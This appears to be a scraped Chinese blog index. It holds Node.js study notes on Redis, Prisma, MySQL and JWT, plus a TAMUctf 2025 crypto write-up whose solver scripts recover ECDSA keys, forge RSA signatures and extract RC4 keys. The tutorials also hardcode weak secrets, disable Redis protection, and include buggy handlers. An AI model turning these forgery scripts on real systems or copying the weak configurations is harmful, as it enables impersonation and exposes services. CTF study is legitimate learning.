其实就是redis多个实例之间进行通讯，但是不能持久化 事务 不能回滚，保证原子的一致性 打开 multi 关闭 discard 127.0.0.1:6379\u003e set A 100 OK 127.0.0.1:6379\u003e set B 100 OK 127.0.0.1:6379\u003e multi OK 127.0.0.1:6379(TX)\u003e set A 0 QUEUED 127.0.0.1:6379(TX)\u003e set B 200 QUEUED 127.0.0.1:6379(TX)\u003e exec 1) OK 2) OK 有点类似于队列，可以写入一堆东西，然后一块执行，那如果可以定时，就是理想的使用方法了 ","date":"2025-04-06","objectID":"/study_nodejs4/:1:7","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"主从复制 docker实现也不算麻烦 主 mkdir -p /home/docker/redis6379/conf mkdir -p /home/docker/redis6379/data vi /home/docker/redis6379/conf/redis.conf # 服务端口 默认6379 port 6379 # 关闭保护模式，允许远程连接 protected-mode no # 密码 requirepass 123456 从 mkdir -p /home/docker/redis6380/conf mkdir -p /home/docker/redis6380/data vi /home/docker/redis6380/conf/redis.conf # 服务端口 默认6379 port 6380 # 关闭保护模式，允许远程连接 protected-mode no # 密码 requirepass 123456 # 主节点密码 masterauth 123456 # 主从复制 replicaof 172.16.8.186 6379 启动 主 docker run -d \\ -p 6379:6379 \\ --name redis6379 \\ --restart always \\ --privileged=true \\ -v /home/docker/redis6379/conf/redis.conf:/etc/redis/redis.conf \\ -v /home/docker/redis6379/data:/data \\ redis:latest \\ redis-server /etc/redis/redis.conf 从 docker run -d \\ -p 6381:6381 \\ --name redis6381 \\ --restart always \\ --privileged=true \\ -v /home/docker/redis6381/conf/redis.conf:/etc/redis/redis.conf \\ -v /home/docker/redis6381/data:/data \\ redis:latest \\ redis-server /etc/redis/redis.conf ","date":"2025-04-06","objectID":"/study_nodejs4/:1:8","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"redis\u0026nodejs联动 npm i ioredis import Redis from \"ioredis\"; //命令行=\u003e面向对象 const redis = new Redis({ host: \"127.0.0.1\", port: 6379, }) // redis.set(\"name\", \"zhangsan\") // redis.get(\"name\").then((res) =\u003e { // console.log(res) // }) //redis.setex(\"age\",5, 18)//设置过期时间 //redis.sadd(\"set\", \"a\", \"b\", \"c\") // redis.smembers(\"set\").then((res) =\u003e { // console.log(res) // }) // redis.srem(\"set\", \"a\", \"b\", \"c\") // redis.hset(\"hash\", \"name\", \"zhangsan\", \"age\", 18) //redis.hdel(\"hash\", \"name\") redis.hgetall(\"hash\").then((res) =\u003e { console.log(res) }) 和数据库的prisma那边不一样，这边感觉就是吧命令直接变成代码了 ","date":"2025-04-06","objectID":"/study_nodejs4/:1:9","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"lua\u0026redis\u0026nodejs 实现一个简单的限流阀，就是比如腾讯游戏抽奖每次只能在有限时间点有限次数的那种 index.html \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"btn\"\u003e抽奖\u003c/button\u003e \u003cscript\u003e const btn = document.getElementById('btn'); btn.onclick = function () { fetch('http://localhost:3000/lottery').then(res =\u003e { return res.text() }).then(data =\u003e { console.log(data) alert(data) }) } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e index.js import express from 'express'; import Redis from 'ioredis'; import fs from 'node:fs'; const lua = fs.readFileSync('./index.lua', 'utf-8'); const redis = new Redis(); const app = express(); //限流阀 const KEY = 'lottery'; const TIME = 30 const LIMIT = 5 // 设置 CORS app.all('*', (req, res, next) =\u003e { res.header('Access-Control-Allow-Origin', '*'); res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS'); res.header('Access-Control-Allow-Headers', 'Content-Type'); next(); }); app.get('/lottery', (req, res) =\u003e { redis.eval(lua, 1, KEY, TIME, LIMIT, (err, result) =\u003e { if (err) { console.log(err) return res.status(500).json({ error: err.message }); } if (result == 1) { res.send('抽奖成功') } else { res.send('请稍后再试') } }) }) app.listen(3000, () =\u003e { console.log('Server is running on port 3000'); }) index.lua local key = KEYS[1] local inerval = tonumber(ARGV[1]) local count = tonumber(ARGV[2]) local limit = tonumber(redis.call(\"get\", key) or \"0\") if limit + 1 \u003e= count then return 0 else redis.call(\"incr\", key) redis.call(\"expire\", key, inerval) return 1 end 只得注意的问题在于跨域处理，感觉lua的语法还是比较简单的，注意和js的交互处理 ","date":"2025-04-06","objectID":"/study_nodejs4/:2:0","tags":["开发","study"],"title":"Study nodejs 「4」","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"MVC 这真的很java吧（） ","date":"2025-04-06","objectID":"/study_nodejs3/:1:0","tags":["开发","study"],"title":"Study nodejs「3」","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"安装依赖 npm install inversify reflect-metadata express inversify-express-util prisma class-validator class-transformer (数据库的东西用的还是上次的，懒得搞了，然后有个版本问题，npm install inversify-express-utils要求inversify@6.0.3express@4.21.1 ) ","date":"2025-04-06","objectID":"/study_nodejs3/:1:1","tags":["开发","study"],"title":"Study nodejs「3」","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"封装方法 main.tx import { InversifyExpressServer } from 'inversify-express-utils' import { Container } from 'inversify' const container = new Container() const server = new InversifyExpressServer(container) const app = server.build() app.listen(3000, () =\u003e { console.log('server started') }) 这是最简单的封装，把express封装成一个server src 下面创建亮个文件夹，一个user,一个db db --index.ts user --server.ts --user.dto.ts --controller.ts ","date":"2025-04-06","objectID":"/study_nodejs3/:1:2","tags":["开发","study"],"title":"Study nodejs「3」","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"正式写入 main.ts import 'reflect-metadata' import { InversifyExpressServer } from 'inversify-express-utils' import { Container } from 'inversify' import { UserController } from './src/user/controller' import { UserService } from './src/user/service' import express from 'express' import { PrismaClient } from '@prisma/client' import { PrismaDB } from './src/db' const container = new Container() //Ioc搞个容器 /** * prisma依赖注入 */ //注入工厂封装db container.bind\u003cPrismaClient\u003e('PrismaClient').toFactory(()=\u003e{ return () =\u003e { return new PrismaClient() } }) container.bind(PrismaDB).toSelf() /** * user模块 */ container.bind(UserService).to(UserService) //添加到容器 container.bind(UserController).to(UserController) //添加到容器 /** * post模块 */ const server = new InversifyExpressServer(container) //返回server //中间件编写在这儿 server.setConfig(app =\u003e { app.use(express.json()) //接受json }) const app = server.build() //app就是express app.listen(3000, () =\u003e { console.log('http://localhost:3000') }) user/controller.ts import { controller, httpGet as GetMapping, httpPost as PostMapping } from 'inversify-express-utils' import { inject } from 'inversify' import { UserService } from './service' import type { Request, Response } from 'express' @controller('/user') //路由 export class UserController { constructor( @inject(UserService) private readonly userService: UserService, //依赖注入 ) { } @GetMapping('/index') //get请求 public async getIndex(req: Request, res: Response) { console.log(req?.user.id) const info = await this.userService.getUserInfo() res.send(info) } @PostMapping('/create') //post请求 public async createUser(req: Request, res: Response) { const user = await this.userService.createUser(req.body) res.send(user) } } user/service.ts import { injectable, inject } from 'inversify' import { UserDto } from './user.dto' import { plainToClass } from 'class-transformer' //dto验证 import { validate } from 'class-validator' //dto验证 import { PrismaDB } from '../db' @injectable() export class UserService { constructor( @inject(PrismaDB) private readonly PrismaDB: PrismaDB //依赖注入 ) { } public async getUserInfo() { return await this.PrismaDB.prisma.user.findMany() } public async createUser(data: UserDto) { const user = plainToClass(UserDto, data) const errors = await validate(user) const dto = [] if (errors.length) { errors.forEach(error =\u003e { Object.keys(error.constraints).forEach(key =\u003e { dto.push({ [error.property]: error.constraints[key] }) }) }) return dto } else { const userInfo = await this.PrismaDB.prisma.user.create({ data: user }) return userInfo } } } user/user.dto.ts import { IsNotEmpty, IsEmail } from 'class-validator' import { Transform } from 'class-transformer' export class UserDto { @IsNotEmpty({ message: '用户名必填' }) @Transform(user =\u003e user.value.trim()) name: string @IsNotEmpty({ message: '邮箱必填' }) @IsEmail({},{message: '邮箱格式不正确'}) @Transform(user =\u003e user.value.trim()) email: string } db/index.ts import { injectable, inject } from 'inversify' import { PrismaClient } from '@prisma/client' @injectable() export class PrismaDB { prisma: PrismaClient constructor(@inject('PrismaClient') PrismaClient: () =\u003e PrismaClient) { this.prisma = PrismaClient() } } 总体思想是去把不同的部分去分别封装，然后通过inversify去注入，这样子就实现了一个简单的MVC框架，有点类似java了，但是更加手动，dto验证可以去限制文件内容，类似python的re。 ","date":"2025-04-06","objectID":"/study_nodejs3/:1:3","tags":["开发","study"],"title":"Study nodejs「3」","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"JWT ","date":"2025-04-06","objectID":"/study_nodejs3/:2:0","tags":["开发","study"],"title":"Study nodejs「3」","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"安装依赖 npm install jsonwebtoken passport passport-jwt ","date":"2025-04-06","objectID":"/study_nodejs3/:2:1","tags":["开发","study"],"title":"Study nodejs「3」","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"实现 我们在src中新建一个文件夹jwt，新建一个index.ts jwt/index.ts import { injectable} from 'inversify' import passport from 'passport' import jsonwebtoken from 'jsonwebtoken' import {Strategy,ExtractJwt} from 'passport-jwt' @injectable() export class JWT { private secret:string='awfbkuahfbakjhfbafuwhjbeawhjfn' private jwtOptions={ jwtFromRequest:ExtractJwt.fromAuthHeaderAsBearerToken(), secretOrKey:this.secret } constructor(){ this.strategy() } public strategy(){ let str=new Strategy(this.jwtOptions,(payload,done)=\u003e{ done(null,payload) }) passport.use(str)//激活插件 } static middleware(){ return passport.authenticate('jwt',{session:false}) }//经过jwt认证后才能进入到下一个 //生成token public createToken(data:Object) { jsonwebtoken.sign(data,this.secret,{expiresIN:'1h'}) } //关联express public init(){ return passport.initialize() } } 需要注意的是我们要去激活插件，并且要关联express main.ts import 'reflect-metadata' import { InversifyExpressServer } from 'inversify-express-utils' import { Container } from 'inversify' import { User } from './src/user/controller' import { UserService } from './src/user/services' import express from 'express' import { PrismaClient } from '@prisma/client' import { PrismaDB } from './src/db' import { JWT } from './src/jwt' const container = new Container() /** * user模块 */ container.bind(User).to(User) container.bind(UserService).to(UserService) /** * 封装PrismaClient */ container.bind\u003cPrismaClient\u003e('PrismaClient').toFactory(() =\u003e { return () =\u003e { return new PrismaClient() } }) container.bind(PrismaDB).to(PrismaDB) /** * jwt模块 */ container.bind(JWT).to(JWT) //主要代码 const server = new InversifyExpressServer(container) server.setConfig((app) =\u003e { app.use(express.json()) app.use(container.get(JWT).init()) //主要代码 }) const app = server.build() app.listen(3000, () =\u003e { console.log('Listening on port 3000') }) user/controller.ts import { controller, httpGet as GetMapping, httpPost as PostMapping } from 'inversify-express-utils' import { UserService } from './services' import { inject } from 'inversify' import type { Request, Response } from 'express' import { JWT } from '../jwt' const {middleware} = new JWT() @controller('/user') export class User { constructor(@inject(UserService) private readonly UserService: UserService) { } @GetMapping('/index',middleware()) //主要代码 public async getIndex(req: Request, res: Response) { let result = await this.UserService.getList() res.send(result) } @PostMapping('/create') public async createUser(req: Request, res: Response) { let result = await this.UserService.createUser(req.body) res.send(result) } } user/services.ts import { injectable, inject } from 'inversify' import { PrismaDB } from '../db' import { UserDto } from './user.dto' import { plainToClass } from 'class-transformer' import { validate } from 'class-validator' import { JWT } from '../jwt' @injectable() export class UserService { constructor( @inject(PrismaDB) private readonly PrismaDB: PrismaDB, @inject(JWT) private readonly jwt: JWT //依赖注入 ) { } public async getList() { return await this.PrismaDB.prisma.user.findMany() } public async createUser(user: UserDto) { let userDto = plainToClass(UserDto, user) const errors = await validate(userDto) if (errors.length) { return errors } else { const result = await this.PrismaDB.prisma.user.create({ data: user }) return { ...result, token: this.jwt.createToken(result) //生成token } } } } 然后会发现接收信息存在类型问题，我们在main.ts加入 declare global { namespace Express { interface Request { id: number name: string email: string } } } ","date":"2025-04-06","objectID":"/study_nodejs3/:2:2","tags":["开发","study"],"title":"Study nodejs「3」","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"最后结构 ├── main.ts # 应用入口文件 ├── src/ ├── db/ # 数据库相关 │ └── index.ts ├── jwt/ # JWT认证相关 │ └── index.ts └── user/ # 用户模块 ├── controller.ts # 控制器 ├── service.ts # 服务层 └── user.dto.ts # 数据传输对象 ","date":"2025-04-06","objectID":"/study_nodejs3/:3:0","tags":["开发","study"],"title":"Study nodejs「3」","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"nodejs\u0026mysql 现在学mysql和sqlserver(学校老师强制要求的)比较多，就先拿这些举例子了 ","date":"2025-04-01","objectID":"/study_nodejs2/:1:0","tags":["开发","study"],"title":"Study nodejs「2」","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"mysql2 一个把nodejs\u0026mysql\u0026express连接的包，顺便使用js-yaml去写配置 npm install mysql2 express js-yaml db.config.yaml db: user:root password:'root' host:127.0.0.1 port:3306 database:test 主要把ip端口和账号密码以及库的名称写入进去 index.js import express from 'express'; import mysql2 from 'mysql2/promise'; import fs from 'fs'; import jsyaml from 'js-yaml'; const yaml = fs.readFileSync('./db.config.yaml', 'utf8') const config = jsyaml.load(yaml) console.log(config) const sql = await mysql2.createConnection({ ...config.db }) const app = express(); app.use(express.json()) app.get('/', async (res, req) =\u003e { const [data] = await sql.query('SELECT * FROM users') res.send(data) }) app.get('/user/:id', async (res, req) =\u003e { const [row] = await sql.query('SELECT * FROM users WHERE id = ?', [req.params.id]) res.send(row) }) app.use('/create', async (req, res) =\u003e { const { name, age, hobby } = req.body await sql.query('INSERT INTO users (name,age,hobby) VALUES (?,?,?)', [name, age, hobby]) res.send('ok') }) app.use('/update', async (req, res) =\u003e { const { id, name, age, hobby } = req.body await sql.query('UPDATE users SET name = ?, age = ?, hobby = ? WHERE id = ?', [name, age, hobby, id]) res.send('ok') }) app.post('/delete',async (req,res)=\u003e{ await sql.query(`delete from user where id = ?`,[req.body.id]) res.send({ok:1}) }) const port = 3000; app.listen(port, () =\u003e { console.log(`Server is running on port ${port}`); }); 通过上面的接口实现增删改查，然后测试的话用的是vsc的REST Client插件 # 查询全部 GET http://localhost:3000/ HTTP/1.1 # 单个查询 GET http://localhost:3000/user/2 HTTP/1.1 # 添加数据 POST http://localhost:3000/create HTTP/1.1 Content-Type: application/json { \"name\":\"张三\", \"age\":18 } # 更新数据 POST http://localhost:3000/update HTTP/1.1 Content-Type: application/json { \"name\":\"法外狂徒\", \"age\":20, \"id\":23 } #删除 # POST http://localhost:3000/delete HTTP/1.1 # Content-Type: application/json # { # \"id\":24 # } ","date":"2025-04-01","objectID":"/study_nodejs2/:1:1","tags":["开发","study"],"title":"Study nodejs「2」","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"prisma 一个现代的orm框架，使用起来比较方便，流行的数据库也都支持。 ","date":"2025-04-01","objectID":"/study_nodejs2/:1:2","tags":["开发","study"],"title":"Study nodejs「2」","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"安装以及初始化 //安装 npm install prisma //初始化 prisma init --datasource-provider mysql //连接mysql 修改.env文件 [DATABASE_URL=\"mysql://账号:密码@主机:端口/库名\"] ","date":"2025-04-01","objectID":"/study_nodejs2/:1:3","tags":["开发","study"],"title":"Study nodejs「2」","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"创建数据库 prisma/schema.prisma model Post { id Int @id @default(autoincrement()) //id 整数 自增 title String //title字符串类型 publish Boolean @default(false) //发布 布尔值默认false author User @relation(fields: [authorId], references: [id]) //作者 关联用户表 关联关系 authorId 关联user表的id authorId Int } model User { id Int @id @default(autoincrement()) name String email String @unique posts Post[] } 执行命令 prisma migrate dev 或者是直接全部写入 generator client { provider = \"prisma-client-js\" } datasource db { provider = \"mysql\" url = env(\"DATABASE_URL\") } model Post { id Int @id @default(autoincrement()) //id 整数 自增 title String //title字符串类型 publish Boolean @default(false) //发布 布尔值默认false author User @relation(fields: [authorId], references: [id]) //作者 关联用户表 关联关系 authorId 关联user表的id authorId Int } model User { id Int @id @default(autoincrement()) name String email String @unique posts Post[] } 他会自动帮你创建一个.sql文件 -- CreateTable CREATE TABLE `Post` ( `id` INTEGER NOT NULL AUTO_INCREMENT, `title` VARCHAR(191) NOT NULL, `publish` BOOLEAN NOT NULL DEFAULT false, `authorId` INTEGER NOT NULL, PRIMARY KEY (`id`) ) DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; -- CreateTable CREATE TABLE `User` ( `id` INTEGER NOT NULL AUTO_INCREMENT, `name` VARCHAR(191) NOT NULL, `email` VARCHAR(191) NOT NULL, UNIQUE INDEX `User_email_key`(`email`), PRIMARY KEY (`id`) ) DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; -- AddForeignKey ALTER TABLE `Post` ADD CONSTRAINT `Post_authorId_fkey` FOREIGN KEY (`authorId`) REFERENCES `User`(`id`) ON DELETE RESTRICT ON UPDATE CASCADE; ","date":"2025-04-01","objectID":"/study_nodejs2/:1:4","tags":["开发","study"],"title":"Study nodejs「2」","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"使用 其实这个东西和ts联动是最强的，所以下面就写ts了 import express from 'express' import { PrismaClient } from '@prisma/client' const prisma = new PrismaClient() const app = express() const port: number = 3000 app.use(express.json()) //关联查找 app.get('/', async (req, res) =\u003e { const data = await prisma.user.findMany({ include: { posts: true } }) res.send(data) }) //单个查找 app.get('/user/:id', async (req, res) =\u003e { const row = await prisma.user.findMany({ where: { id: Number(req.prisma.id) } }) res.send(row) }) //新增 app.post('/create', async (req, res) =\u003e { const { name, email } = req.body const data = await prisma.user.create({ data: { name, email, posts: { create: { title: '标题', publish: true }, } } }) res.send(data) }) //更新 app.post('/update',async (req, res) =\u003e { const {id,name,email}=req.body const data=await prisma.user.update({ where:{ id:Number(id) }, data:{ name, email } }) req.send(data) }) //删除 app.post('/delete', async (req, res) =\u003e { const { id } = req.body await prisma.post.deleteMany({ where: { authorId: Number(id) } }) const data = await prisma.user.delete({ where: { id: Number(id), }, }) res.send(data) }) app.listen(port, () =\u003e { console.log(`Example app listening on port ${port}`) }) ","date":"2025-04-01","objectID":"/study_nodejs2/:1:5","tags":["开发","study"],"title":"Study nodejs「2」","uri":"/study_nodejs2/"},{"categories":["CTF"],"content":"前言 这是一个国外学校的比赛，密码质量很高 ","date":"2025-03-31","objectID":"/tamuctf2025/:1:0","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"题目 ","date":"2025-03-31","objectID":"/tamuctf2025/:2:0","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"ECC Can you get the secret key from the following two signed messages? 1st Message: “The secp256r1 curve was used.” 2nd Message: “k value may have been re-used.” 1st Signature r value: 91684750294663587590699225454580710947373104789074350179443937301009206290695 1st Signature s value: 8734396013686485452502025686012376394264288962663555711176194873788392352477 2nd Signature r value: 91684750294663587590699225454580710947373104789074350179443937301009206290695 2nd Signature s value: 96254287552668750588265978919231985627964457792323178870952715849103024292631 The flag is the secret key used to sign the messages. It will be in the flag format. task from Crypto.Util.number import bytes_to_long, long_to_bytes from hashlib import sha256 from secret import sign message1 = \"The secp256r1 curve was used.\" message2 = \"k value may have been re-used.\" message1 = bytes_to_long(sha256(message1.encode()).digest()) message2 = bytes_to_long(sha256(message2.encode()).digest()) r1, s1 = sign(message1) r2, s2 = sign(message2) print(f\"r1: {r1}, s1: {s1}\") print(f\"r2: {r2}, s2: {s2}\") 很简单的ECDSA，直接计算即可 exp from hashlib import sha256 from Crypto.Util.number import* n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 message1 = \"The secp256r1 curve was used.\" message2 = \"k value may have been re-used.\" r = 91684750294663587590699225454580710947373104789074350179443937301009206290695 s1 = 8734396013686485452502025686012376394264288962663555711176194873788392352477 s2 = 96254287552668750588265978919231985627964457792323178870952715849103024292631 H_m1 = bytes_to_long(sha256(message1.encode()).digest()) H_m2 = bytes_to_long(sha256(message2.encode()).digest()) print(f\"H(m1) = {H_m1}\") print(f\"H(m2) = {H_m2}\") diff_h = (H_m1 - H_m2) % n diff_s = (s1 - s2) % n inv_diff_s = inverse(diff_s, n) k = (diff_h * inv_diff_s) % n print(f\"k = {k}\") r_inv = inverse(r, n) d = ((s1 * k - H_m1) % n) * r_inv % n print(f\"Private key d = {d}\") k_inv = inverse(k, n) computed_s1 = (k_inv * (H_m1 + d * r)) % n computed_s2 = (k_inv * (H_m2 + d * r)) % n print(long_to_bytes(d)) ","date":"2025-03-31","objectID":"/tamuctf2025/:2:1","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"Mod task import re with open(\"flag.txt\") as f: flag = f.read() assert re.fullmatch(r\"gigem\\{[a-z0-9_]{38}\\}\",flag) flag_num = int.from_bytes(flag.encode(), 'big') assert flag_num % 114093090821120352479644063983906458923779848139997892783140659734927967458173 == 58809011802516045741268578327158509054400633329629779038362406616616290661238 一个很像小鸡块在nss的dlc出的题，但是更加复杂，鸡块的题大部分是在同一个范围，比如07，Nss这种有规律性的，或者是可以用线性表达的，但是这个题不行，我尝试了只用09的数字去求解flag，可以规约出来一组，但是并不是目标答案 官方预期解法 import string import re from sage.all import * chrs = (string.ascii_letters + string.digits + \"_\").encode() avg = sorted(chrs)[len(chrs) // 2] - 1 print(f\"{avg = }\") print([x - avg for x in sorted(chrs)]) # within [-37, 37] flaglen = 38 M = 114093090821120352479644063983906458923779848139997892783140659734927967458173 C = int.from_bytes(b\"gigem{\" + b\"\\x00\" * flaglen + b\"}\", \"big\") rem = 58809011802516045741268578327158509054400633329629779038362406616616290661238 C -= rem P = PolynomialRing(ZZ, \"ap\", flaglen) aps = P.gens() aa = [ap + avg for ap in aps] f = C + sum([a * 256**i for i, a in enumerate(aa)]) * 256 print(f) L = matrix(f.coefficients()).T L = block_matrix([[M, 0], [L, 1]]) bounds = [1] + [37] * flaglen + [1] scale = [2**20 // i for i in bounds] Q = diagonal_matrix(scale) L *= Q L = L.BKZ(block_size=25) L /= Q # not good enough # for row in L: # if row[-1] \u003c 0: # row = -row # if row[0] == 0 and row[-1] == 1: # print(row) # print(f(*row[1:-1]) % M == 0) # aa = [x + avg for x in row[1:-1]][::-1] # flag = b\"gigem{\" + bytes(aa) + b\"}\" # # assert int.from_bytes(flag, \"big\") % M == rem # print(flag) # exit() from fpylll import IntegerMatrix, LLL from fpylll.fplll.gso import MatGSO from fpylll.fplll.enumeration import Enumeration sols = [] L[:, 0] *= 2**10 A = IntegerMatrix.from_matrix(L.change_ring(ZZ)) LLL.reduction(A) MG = MatGSO(A) MG.update_gso() sol_cnt = 10000 enum = Enumeration(MG, sol_cnt) size = int(L.nrows()) bound = 37 answers = enum.enumerate(0, size, (size * bound**2), 0, pruning=None) for _, s in answers: v = IntegerMatrix.from_iterable(1, A.nrows, map(int, s)) sv = v * A if abs(sv[0, size - 1]) \u003c= bound and sv[0, -1] in (-1, 1): print(sv) neg = sv[0, -1] sol = [neg * sv[0, i + 1] for i in range(flaglen)] assert f(*sol) % M == 0 aa = [x + avg for x in sol][::-1] try: flag = b\"gigem{\" + bytes(aa) + b\"}\" except: continue assert int.from_bytes(flag, \"big\") % M == rem print(flag) try: if re.fullmatch(r\"gigem{\\w{38}}\", flag.decode()): print(\"FOUND\") break except UnicodeDecodeError: pass 赛后我用另一个赛题的wp中的方法运行三十分钟出来了， 链接https://connor-mccartney.github.io/cryptography/other/onelinecrypto-SeeTF-2023 from Crypto.Util.number import * from sage.all import * import re def lattice_enumeration(L, bound, sol_cnt=1_000_000): from fpylll import IntegerMatrix, LLL from fpylll.fplll.gso import MatGSO from fpylll.fplll.enumeration import Enumeration A = IntegerMatrix.from_matrix(L) LLL.reduction(A) M_mat = MatGSO(A) M_mat.update_gso() size = int(L.nrows()) enum = Enumeration(M_mat, sol_cnt) answers = enum.enumerate(0, size, (size * bound**2), 0, pruning=None) print(f'Got {len(answers)} answers') for _, s in answers: # print(len(answers)) v = IntegerMatrix.from_iterable(1, A.nrows, map(int, s)) sv = v * A if abs(sv[0, size - 1]) \u003c= bound: yield sv[0] M_val = 114093090821120352479644063983906458923779848139997892783140659734927967458173 R_val = 58809011802516045741268578327158509054400633329629779038362406616616290661238 C = bytes_to_long(b\"gigem{\" + bytes(38) + b\"}\") a = 85 dim = 38 M_lattice = (identity_matrix(dim) .augment(vector([0]*dim)) .augment(vector([256**i for i in range(dim, 0, -1)])) .stack(vector([-a]*dim + [1, C - R_val])) .stack(vector([0]*dim + [0, -M_val])) ) found = False for row in lattice_enumeration(M_lattice.change_ring(ZZ), 37, sol_cnt=500_000): for sign in [1, -1]: r = [sign * x for x in row] if r[-2:] != [1, 0]: continue try: candidate = b\"gigem{\" + bytes([x + a for x in r[:-2]]) + b\"}\" if re.fullmatch(r\"[a-z0-9_]{38}\", candidate.decode()[6:-1]): if int.fr","date":"2025-03-31","objectID":"/tamuctf2025/:2:2","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"Smelter 原附件有点大，不放了，个人感觉没mod恶心 exp SHA256_OID = (2, 16, 840, 1, 101, 3, 4, 2, 1) class AlgorithmIdentifier(univ.Sequence): componentType = namedtype.NamedTypes( namedtype.NamedType('algorithm', univ.ObjectIdentifier()), namedtype.NamedType('parameters', univ.Null()) ) class DigestInfo(univ.Sequence): componentType = namedtype.NamedTypes( namedtype.NamedType('digestAlgorithm', AlgorithmIdentifier()), namedtype.NamedType('digest', univ.OctetString()) ) def get_digestinfo(hash_bytes): alg = AlgorithmIdentifier() alg['algorithm'] = SHA256_OID alg['parameters'] = univ.Null() di = DigestInfo() di['digestAlgorithm'] = alg di['digest'] = hash_bytes return encoder.encode(di) def integer_cube_root(n: int) -\u003e int: low = 0 high = 1 \u003c\u003c ((n.bit_length() + 2) // 3) while low \u003c high: mid = (low + high) // 2 if mid**3 \u003c n: low = mid + 1 else: high = mid if low**3 \u003e n: low -= 1 return low # The Forgery Routin def forge_signature(): message = b\"admin\" h = hashlib.sha256(message).digest() t = get_digestinfo(h) minimal_prefix = b\"\\x00\\x01\\xff\\x00\" + t target_block = minimal_prefix.ljust(256, b\"\\x00\") target_int = int.from_bytes(target_block, byteorder=\"big\") s = integer_cube_root(target_int) while True: candidate = s**3 candidate_bytes = candidate.to_bytes(256, byteorder=\"big\") try: data_section = candidate_bytes[3:] sep_index = data_section.index(b\"\\x00\") recovered = data_section[sep_index+1:] except Exception: recovered = b\"\" if candidate_bytes.startswith(b\"\\x00\\x01\\xff\\x00\") and recovered.startswith(t): break s += 1 forged_sig = s.to_bytes(256, byteorder=\"big\") print(\"forged sing (b64):\") print(base64.b64encode(forged_sig).decode()) return forged_sig if __name__ == \"__main__\": forge_signature() ","date":"2025-03-31","objectID":"/tamuctf2025/:2:3","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"RC4 task from Crypto.Cipher import ARC4 import os from string import printable from random import choices IV = ''.join(choices(printable,k=32)).encode() for i in range(96): nonce = input(\"Give me a prefix (hex): \") try: nonce = bytes.fromhex(nonce) except: print(\"Make sure to send in hex.\") exit() if len(nonce) + len(IV) \u003e 256: print(\"Your prefix is too long.\") exit() try: cipher = ARC4.new(nonce + IV) except: print(\"Could not create the cipher.\") exit() pt = b\"\\0\" ct = cipher.encrypt(pt) print(f\"Your lucky number is {ord(ct)}\") guess = input(\"What was the IV(hex): \") try: guess = bytes.fromhex(guess) except: print(\"Make sure to send your guess for the IV in hex.\") exit() if IV == guess: with open(\"flag.txt\",\"r\") as f: FLAG = f.read() print(FLAG) else: print(f\"WRONG! IV was {IV.hex()}\") from pwn import * context.log_level = \"debug\" io = remote(\"tamuctf.com\", 443, ssl=True, sni=\"tamuctf_rc4-prefix\") io.interactive(prompt=\"\") 有一说一，不是特别熟，这里借鉴别的佬的代码，回头学会了单独写吧 exp from Crypto.Cipher import ARC4 import random from pwn import * from collections import Counter def key_schedule(key): S = list(range(256)) j = 0 for i in range(len(key)): j = (j + S[i] + key[i]) % 256 S[i], S[j] = S[j], S[i] return S def get_prefix(ind, known): while True: prefix = random.randbytes(256-32) key = prefix + known S = key_schedule(key) if (S[1] + S[S[1]])%256 == ind: return prefix def oracle(prefix): io.sendline(prefix.hex()) io.recvuntil(b'number is ') return int(io.recvline(keepends=False)) def Most_Common(lst): data = Counter(lst) return data.most_common(1)[0][0] key = b'a'*32 known_key = b'' #context.log_level = \"debug\" io = remote(\"tamuctf.com\", 443, ssl=True, sni=\"tamuctf_rc4-prefix\") #io = process(\"python3 ./RC4_prefix.py\", shell=True) for i in range(32): results = [] for _ in range(3): prefix = get_prefix(256-32 + i, known_key) leak = oracle(prefix) for j in range(256): S = key_schedule(prefix + known_key + bytes([j])) if S[(S[1] + S[S[1]])%256] == leak: results.append(j) known_key += bytes([Most_Common(results)]) print(known_key) print(known_key.hex()) io.sendline(known_key.hex()) io.interactive() ","date":"2025-03-31","objectID":"/tamuctf2025/:2:4","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"总结 自己好菜啊啊啊啊啊啊啊啊啊啊 ","date":"2025-03-31","objectID":"/tamuctf2025/:3:0","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["nodejs"],"content":"为什么学nodejs 可能是后面要接手一些项目，或者是些javaspring烦了，学学nodejs玩，目前感觉nodejs的生态还是不错的 